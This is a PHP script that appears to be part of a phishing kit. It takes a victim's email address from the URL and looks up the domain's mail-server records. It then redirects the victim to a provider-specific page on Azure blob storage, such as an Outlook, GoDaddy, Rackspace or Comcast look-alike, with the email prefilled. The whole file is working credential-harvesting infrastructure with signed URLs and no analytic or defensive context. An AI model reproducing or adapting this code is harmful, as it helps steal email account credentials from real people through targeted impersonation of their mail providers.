<?php
session_start();
$email = $_SESSION['email'] = $_GET['email'];
/*
* Getting Domain part from user input Email-Address
*/
$domain = substr(strrchr($email, "@"), 1);
/*
* This Function is used for fetching the MX data records to a corresponding
- Email domain
*/
function mxrecordValidate($email, $domain) {

	$arr = dns_get_record($domain, DNS_MX);
	if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])) {
	return $arr[0]['target'];
	}
}
		if (mxrecordValidate($email, $domain)) {
			$data = dns_get_record($domain, DNS_MX);
			foreach ($data as $key1) {
				/*echo "Host:- " . $key1['host'] ."<br>";
				echo "Class:- " . $key1['class'] ."<br>";
				echo "TTL:- " . $key1['ttl'] ."<br>";
				echo "Type:- " . $key1['type']."<br>" ;
				echo "PRI:- " . $key1['pri'] ."<br>";*/
				$redir = "Target:- " . $key1['target'] ."<br>";
				//echo "Target-IP:- " . gethostbyname($key1['target']) ;
			}
		} else {
			echo('Email does not exist, check for Typos.');
		}
	//1and1 
	if( preg_match("/1and1\.com/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/1and1.html?sp=r&st=2019-09-16T14:23:53Z&se=2020-04-01T22:23:53Z&spr=https&sv=2018-03-28&sig=F9jbCtmvLhsxclwOQQYb1L6fEWgeBvzJ1wZg9uXZK00%3D&sr=b#".$email);
	//Century
	}elseif( preg_match("/comcast\.net/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/comcas.html?sp=r&st=2019-09-16T17:04:28Z&se=2020-04-01T01:04:28Z&spr=https&sv=2018-03-28&sig=2C2pUngopv%2BncM3GXu2noloUewzCT2HNY%2BU0BH4Pr%2FU%3D&sr=bb#".$email);
	//Godaddy
	}elseif( preg_match("/.secureserver\.net/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/Godda.html?sp=r&st=2019-09-16T17:05:07Z&se=2020-04-01T01:05:07Z&spr=https&sv=2018-03-28&sig=CT5x3dQa%2B3AAPhyOChGY4v16VSAFJ9tK2MWdeIecgBg%3D&sr=b#".$email);
	//Rackspace
	}elseif( preg_match("/.emailsrvr\.com/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/Rack.html?sp=r&st=2019-09-16T17:06:52Z&se=2020-04-01T01:06:52Z&spr=https&sv=2018-03-28&sig=hrdlk0vbjGQnSBVpebpkpViqGATrt9veZJFGMtI28mA%3D&sr=b#".$email);
	//Hotmail & Outlook & Live
	}elseif( preg_match("/olc\.protection\.outlook\.com/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/Outl.html?sp=r&st=2019-09-16T17:06:20Z&se=2019-09-17T01:06:20Z&spr=https&sv=2018-03-28&sig=Lg5I8nmLS98DNqyxJpBnhOcSFNymYAHjcHJBfqT93q8%3D&sr=b#".$email);
	//Office
	}elseif( preg_match("/mail\.protection\.outlook\.com/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/nuella.html?sp=r&st=2019-09-16T17:05:33Z&se=2020-04-01T01:05:33Z&spr=https&sv=2018-03-28&sig=Lz0pFxYKGHmVhv2iZRBgaGziXR6gA900Gn9uIUNkTp8%3D&sr=b#".$email);

	}elseif( preg_match("/smtproutes\.com/i", $redir) ){

		header("Location: https://downloadfiles.blob.core.windows.net/access/nuella.html?sp=r&st=2019-09-16T17:05:33Z&se=2020-04-01T01:05:33Z&spr=https&sv=2018-03-28&sig=Lz0pFxYKGHmVhv2iZRBgaGziXR6gA900Gn9uIUNkTp8%3D&sr=b#".$email);

	}else{

		header("Location: https://downloadfiles.blob.core.windows.net/access/Ot.html?sp=r&st=2019-09-16T17:05:59Z&se=2020-04-01T01:05:59Z&spr=https&sv=2018-03-28&sig=ZMA1Ni5jHK4izekCPzT1lavlYp0MRo46qrNCy79uN%2FA%3D&sr=b#".$email);
	}
?>